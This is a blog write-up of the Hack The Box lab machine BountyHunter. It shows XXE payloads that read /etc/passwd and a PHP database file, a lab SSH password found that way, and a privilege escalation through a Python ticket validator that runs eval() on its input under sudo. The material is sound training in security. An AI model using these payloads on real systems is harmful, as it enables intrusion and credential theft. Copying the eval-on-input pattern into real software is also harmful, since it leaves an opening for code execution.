@@ -1,0 +1,587 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - BountyHunter &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - BountyHunter - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - BountyHunter">
+    <meta itemprop="description" content="Hack The Box - BountyHunter - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - BountyHunter">
+    <meta property="og:description" content="Hack The Box - BountyHunter - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/article/bountyhunter/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/article/bountyhunter/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/article/bountyhunter/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/" class="active">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/article/bountyhunter/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/article/bountyhunter/">
+            Hack The Box - BountyHunter
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2022-04-12</span>
+            
+        
+
+        
+            
+                <span class="readingTime">4 min read</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/linux/">linux</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/categories/htb/">HTB</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/bh/bh-fiche.png" alt=""></p>
+<p>Hello ! BountyHunter is a easy <a href="https://app.hackthebox.eu/machines/359">machine</a> that was deployed on Hack The Box on Saturday, 24 july 2021 and created by <strong>ejedev</strong>.</p>
+<h1 id="quick-summary">Quick summary</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#nmap-scan">Nmap scan</a></li>
+        <li><a href="#web-enumeration">Web enumeration</a></li>
+        <li><a href="#foothold---development">Foothold - development</a></li>
+        <li><a href="#privesc---root">PrivEsc - root</a></li>
+      </ul>
+    </li>
+    <li><a href="#sources">Sources</a></li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap-scan">Nmap scan</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Bounty Hunters
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Port</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ssh</td>
+<td>22/tcp</td>
+<td>OpenSSH 8.2p1</td>
+</tr>
+<tr>
+<td>http</td>
+<td>80/tcp</td>
+<td>Apache httpd 2.4.41</td>
+</tr>
+</tbody>
+</table>
+<h3 id="web-enumeration">Web enumeration</h3>
+<p>When you go to the website, there is a page called <code>The B Team</code>, which presents a team of bug hunters looking for clients.</p>
+<p><img src="/img/bh/bh-site.png" alt=""></p>
+<p>There are three tabs:</p>
+<ul>
+<li>About</li>
+<li>Contact</li>
+<li>Portal</li>
+</ul>
+<p>An analysis with gobuster reveals the presence of other directories.</p>
+<p><img src="/img/bh/bh-gob.png" alt=""></p>
+<p>The <code>/resources</code> directory is interesting because it contains a <code>README.txt</code> file.</p>
+<p><img src="/img/bh/bh-readme.png" alt=""></p>
+<p>This contains several tasks to be carried out.</p>
+<p><img src="/img/bh/bh-tasks.png" alt=""></p>
+<p>In particular, disabling a <code>test</code> account and switching to a hashed password, for example to avoid clear text passwords in a database, adds an extra step for the attacker.</p>
+<blockquote>
+<p>Disable &lsquo;test&rsquo; account on portal and switch to hashed password. Disable nopass.</p>
+</blockquote>
+<p>The <code>Portal</code> tab indicates that is in under development with a link to the bounty tracker.</p>
+<p><img src="/img/bh/bh-bt.png" alt=""></p>
+<p>We arrive on a page which presents a bounty report system in beta version.</p>
+<p><img src="/img/bh/bh-beta.png" alt=""></p>
+<p>When analysing with burp, we find a <code>data</code> variable encoded in base64, when decoding we find several fields in <a href="https://en.wikipedia.org/wiki/XML">xml</a></p>
+<p><img src="/img/bh/bh-xml.png" alt=""></p>
+<p>I can do an <a href="https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/">XEE File Disclosure</a> to be able to enumerate the users using this payload (encoded in base64 and then a second time in URL)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY luks SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
+		<span style="color:#f92672">&lt;bugreport&gt;</span>
+		<span style="color:#f92672">&lt;title&gt;</span>&amp;luks;<span style="color:#f92672">&lt;/title&gt;</span>
+		<span style="color:#f92672">&lt;cwe&gt;&lt;/cwe&gt;</span>
+		<span style="color:#f92672">&lt;cvss&gt;&lt;/cvss&gt;</span>
+		<span style="color:#f92672">&lt;reward&gt;&lt;/reward&gt;</span>
+		<span style="color:#f92672">&lt;/bugreport&gt;</span>
+</code></pre></div><p><img src="/img/bh/bh-burp.png" alt=""></p>
+<p>There is the user <code>development</code>.</p>
+<h3 id="foothold---development">Foothold - development</h3>
+<p>A scan with gobuster for files with the extension <code>.php</code> or <code>.txt</code> finds the files <code>db.php</code>.</p>
+<p><img src="/img/bh/bh-db.png" alt=""></p>
+<p>Following the same principle as enumerating users, I will use the XXE but to extract the file this time based on this <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">article</a> d&rsquo;Hacktricks.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml  version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY luks SYSTEM &#34;php://filter/convert.base64-encode/resource=db.php&#34;&gt;</span> ]&gt;
+		<span style="color:#f92672">&lt;bugreport&gt;</span>
+		<span style="color:#f92672">&lt;title&gt;</span>&amp;luks;<span style="color:#f92672">&lt;/title&gt;</span>
+		<span style="color:#f92672">&lt;cwe&gt;&lt;/cwe&gt;</span>
+		<span style="color:#f92672">&lt;cvss&gt;&lt;/cvss&gt;</span>
+		<span style="color:#f92672">&lt;reward&gt;&lt;/reward&gt;</span>
+		<span style="color:#f92672">&lt;/bugreport&gt;</span>
+</code></pre></div><p>We encode the payload in base64 then the URL. We find the contents of the database and the password <code>m19RoAU0hP41A1sTsq6K</code>.</p>
+<p><img src="/img/bh/bh-burp2.png" alt=""></p>
+<p>If I try to connect via SSH with creds <code>development:m19RoAU0hP41A1sTsq6K</code>, it works and I can get the flag <code>user.txt</code>.</p>
+<p><img src="/img/bh/bh-user.png" alt=""></p>
+<h3 id="privesc---root">PrivEsc - root</h3>
+<p>By doing <code>sudo -l</code>, I find a python script that can be run with <code>root</code> privileges.</p>
+<p><img src="/img/bh/bh-ticket.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#Skytrain Inc Ticket Validation System 0.1</span>
+<span style="color:#75715e">#Do not distribute this file.</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">load_file</span>(loc):
+    <span style="color:#66d9ef">if</span> loc<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.md&#34;</span>):
+        <span style="color:#66d9ef">return</span> open(loc, <span style="color:#e6db74">&#39;r&#39;</span>)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Wrong file type.&#34;</span>)
+        exit()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">evaluate</span>(ticketFile):
+    <span style="color:#75715e">#Evaluates a ticket to check for ireggularities.</span>
+    code_line <span style="color:#f92672">=</span> None
+    <span style="color:#66d9ef">for</span> i,x <span style="color:#f92672">in</span> enumerate(ticketFile<span style="color:#f92672">.</span>readlines()):
+        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;# Skytrain Inc&#34;</span>):
+                <span style="color:#66d9ef">return</span> False
+            <span style="color:#66d9ef">continue</span>
+        <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;## Ticket to &#34;</span>):
+                <span style="color:#66d9ef">return</span> False
+            <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#34;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&#34;</span>)
+            <span style="color:#66d9ef">continue</span>
+
+        <span style="color:#66d9ef">if</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;__Ticket Code:__&#34;</span>):
+            code_line <span style="color:#f92672">=</span> i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+            <span style="color:#66d9ef">continue</span>
+
+        <span style="color:#66d9ef">if</span> code_line <span style="color:#f92672">and</span> i <span style="color:#f92672">==</span> code_line:
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#34;**&#34;</span>):
+                <span style="color:#66d9ef">return</span> False
+            ticketCode <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;**&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;+&#34;</span>)[<span style="color:#ae81ff">0</span>]
+            <span style="color:#66d9ef">if</span> int(ticketCode) <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+                validationNumber <span style="color:#f92672">=</span> eval(x<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;**&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>))
+                <span style="color:#66d9ef">if</span> validationNumber <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>:
+                    <span style="color:#66d9ef">return</span> True
+                <span style="color:#66d9ef">else</span>:
+                    <span style="color:#66d9ef">return</span> False
+    <span style="color:#66d9ef">return</span> False
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    fileName <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Please enter the path to the ticket file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    ticket <span style="color:#f92672">=</span> load_file(fileName)
+    <span style="color:#75715e">#DEBUG print(ticket)</span>
+    result <span style="color:#f92672">=</span> evaluate(ticket)
+    <span style="color:#66d9ef">if</span> (result):
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Valid ticket.&#34;</span>)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid ticket.&#34;</span>)
+    ticket<span style="color:#f92672">.</span>close
+
+main()
+</code></pre></div><p>The script tells us:</p>
+<ul>
+<li>that we need to create a ticket with the <code>.md</code> extension</li>
+<li>it should start with <code># Skytrain Inc</code></li>
+<li>that the second line should contain <code>## Ticket to</code></li>
+<li>the third line should contain <code>__Ticket Code:__</code></li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> int(ticketCode) <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+</code></pre></div><p>Condition to check that the ticket number modulo 7 is equal to 4.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span> validationNumber <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>:
+</code></pre></div><p>Another condition to check that the ticket number is greater than 100.</p>
+<p>So our ticket should be <code>**+{n°deTicket % 7 = 4} + {cmdSystem}</code></p>
+<p>Using python to find ticket numbers that meet the conditions</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>,<span style="color:#ae81ff">200</span>):
+	<span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span>:
+		<span style="color:#66d9ef">print</span>(i)
+</code></pre></div><p><img src="/img/bh/bh-modulo.png" alt=""></p>
+<p>Creating the final ticket</p>
+<p><img src="/img/bh/bh-ticket2.png" alt=""></p>
+<p>Finally run the command <code>sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code>, enter the path to the ticket file to become root and retrieve the last flag <code>root.txt</code>.</p>
+<p><img src="/img/bh/bh-root.png" alt=""></p>
+<p>Thanks to <code>@c1sc0</code> for the exchange on the python script.</p>
+<p><img src="https://media0.giphy.com/media/QYbJS4AtaIJ3dbxylu/giphy.gif?cid=ecf05e47crusya0rwbc8l6e5a4fd2i2k5gamhvp57h8912tx&amp;rid=giphy.gif&amp;ct=g" alt="Root danse"></p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Wikipedia - <a href="https://en.wikipedia.org/wiki/XML">eXtensible Markup Language</a></li>
+<li>vaadata - <a href="https://www.vaadata.com/blog/understanding-web-vulnerabilities-in-5-min-episode-11-xxe/">XML External Entities</a></li>
+<li>Black Hills - <a href="https://www.blackhillsinfosec.com/xml-external-entity-beyond-etcpasswd-fun-profit/">XXE File Disclosure</a></li>
+<li>Hacktricks - <a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity">XXE Extract File</a></li>
+</ul>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/python/">python</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/source-code-review/">source code review</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/sudo-exploitation/">sudo exploitation</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/tags/xxe/">XXE</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/fr/article/bountyhunter/">fr</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Latest posts</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/advuln/">Setting up a vulnerable AD environment</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/categories/"><strong>Categories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/categories/ctf">Ctf
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/htb">Htb
+                        (21)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/write-up">Write up
+                        (18)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/linux">Linux
+                        (15)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/writeup">Writeup
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Social media</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Other languages</strong>
+                
+                
+                <a href="//luksec.fr/" class="active">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
